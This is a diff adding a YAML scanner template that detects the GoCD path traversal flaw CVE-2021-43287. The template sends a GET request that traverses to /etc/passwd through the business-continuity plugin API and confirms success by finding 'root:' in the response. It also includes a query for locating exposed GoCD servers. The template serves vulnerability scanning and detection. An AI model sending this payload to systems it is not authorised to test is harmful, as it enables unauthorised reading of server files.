@@ -1,0 +1,18 @@
+name: GoCD Unauthorized Path Traversal CVE-2021-43287
+manual: true
+query: body="GoCD"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root:")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-43287
+  - https://www.gocd.org/releases/#21-3-0
+  description: GoCD is a continuous delivery server.
+  tags: pathtraversal
